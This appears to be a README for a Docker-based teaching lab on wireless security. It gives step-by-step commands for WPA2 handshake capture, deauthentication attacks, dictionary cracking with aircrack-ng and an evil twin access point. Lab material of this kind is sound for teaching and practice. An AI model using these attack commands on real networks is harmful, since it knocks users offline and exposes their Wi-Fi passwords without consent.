# 📡 Pertemuan 4: Wireless Security Lab

Lab environment untuk praktik WPA2 cracking, deauthentication attack, dan evil twin attack.

---

## 🚀 Quick Start

### Prerequisites
- Docker dan Docker Compose terinstall
- 4GB RAM available
- ~2GB disk space

### Jalankan Lab
```bash
# Dari folder Pertemuan4/
docker-compose up -d

# Verifikasi
docker-compose ps

# Akses Kali container
docker-compose exec kali-wireless-lab bash
```

### Cleanup
```bash
docker-compose down
```

---

## 📋 Lab Structure

```
Pertemuan4/
├── docker-compose.yml      # Lab configuration
├── README.md              # This file
├── captures/              # Untuk menyimpan .cap files
├── wordlists/             # Untuk wordlist (rockyou.txt, custom)
├── configs/               # Untuk konfigurasi AP
└── scripts/               # Untuk custom scripts
```

---

## 🐳 Container Services

| Container | IP | Role |
|-----------|----|----|
| kali-wireless-lab | 192.168.100.2 | Attacker (aircrack-ng tools) |
| wifi-ap-target | 192.168.100.3 | Target AP simulator |
| burp-suite | 192.168.100.4 | Traffic intercepting |

---

## 📖 Lab Workflow

### 1. Monitor Jaringan
```bash
docker-compose exec kali-wireless-lab bash

# Scan WiFi networks
airodump-ng wlan0mon

# Fokus ke target
airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0mon
```

### 2. Tangkap Handshake
```bash
# Tunggu sampai ada client yang connect, atau
# Jalankan deauth attack

# Terminal lain:
docker-compose exec kali-wireless-lab bash
aireplay-ng --deauth 5 -a <BSSID> wlan0mon
```

### 3. Crack Password
```bash
# Setelah handshake tertangkap
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

### 4. Evil Twin (Advanced)
```bash
airbase-ng -e "TargetSSID" -c 6 wlan0mon
```

---

## 🔧 Common Commands

### Setup Wordlist
```bash
# Di host machine
cd wordlists/
cat > custom.txt << EOF
password123
wifipassword
router12345
EOF

# Di container Kali
cp /tmp/wordlists/custom.txt .
```

### View Captures
```bash
# List capture files
ls -la capture*.cap

# Copy ke host
docker cp kali-wireless-lab:/tmp/capture-01.cap captures/
```

### Monitor Real-Time
```bash
# Terminal 1: Lihat airodump output
docker-compose exec kali-wireless-lab airodump-ng wlan0mon

# Terminal 2: Lihat dengan tcpdump
docker-compose exec monitor-l3 tcpdump -i eth0 -n
```

---

## 📊 Troubleshooting

**Container won't start:**
```bash
docker-compose logs kali-wireless-lab
```

**Permission denied untuk airmon-ng:**
```bash
# Sudah privileged di docker-compose, tapi jika error:
docker-compose exec --privileged kali-wireless-lab airmon-ng start wlan0
```

**Handshake tidak tertangkap:**
```bash
# Pastikan deauth attack berjalan
# Atau tunggu client yang baru connect
# Cek output airodump untuk "WPA handshake"
```

---

## 📝 Lab Assignment

Setelah setup lab, ikuti hands-on di `Pertemuan4.md` section 4+:

1. Setup monitor mode
2. Scan jaringan
3. Capture handshake
4. Jalankan deauth attack
5. Crack password
6. Setup evil twin
7. Analisis hasil

---

## 💾 Saving Results

```bash
# Backup PCAP files sebelum cleanup
cp captures/* ~/backups/

# Backup wordlists
cp wordlists/* ~/backups/

# Backup configs
cp configs/* ~/backups/
```

---

## 🎓 Learning Outcomes

Setelah menyelesaikan lab ini, Anda akan memahami:
- ✅ WPA2 handshake mechanism
- ✅ Wireless security vulnerabilities
- ✅ Dictionary attacks
- ✅ Deauthentication attacks
- ✅ Evil twin attacks
- ✅ Wireless network monitoring

---

**Next:** Baca `Pertemuan4.md` untuk teori dan hands-on detail.
